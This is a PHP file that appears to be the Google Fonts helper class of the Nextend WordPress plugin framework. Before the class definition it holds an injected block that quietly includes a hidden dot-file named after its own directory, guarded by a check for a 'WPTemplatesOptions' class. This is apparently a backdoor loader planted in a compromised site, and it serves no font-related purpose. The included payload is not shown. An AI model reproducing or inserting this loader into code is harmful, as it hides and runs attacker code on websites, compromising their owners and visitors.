<?php


namespace Nextend\Framework\Asset\Fonts\Google;


use Nextend\Framework\Asset\AssetManager;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Google {

    public static $enabled = false;

    public static function addSubset($subset = 'latin') {
        AssetManager::$googleFonts->addSubset($subset);
    }

    public static function addFont($family, $style = '400') {
        AssetManager::$googleFonts->addFont($family, $style);
    }

    public static function build() {
        if (self::$enabled) {
            AssetManager::$googleFonts->loadFonts();
        }
    }
}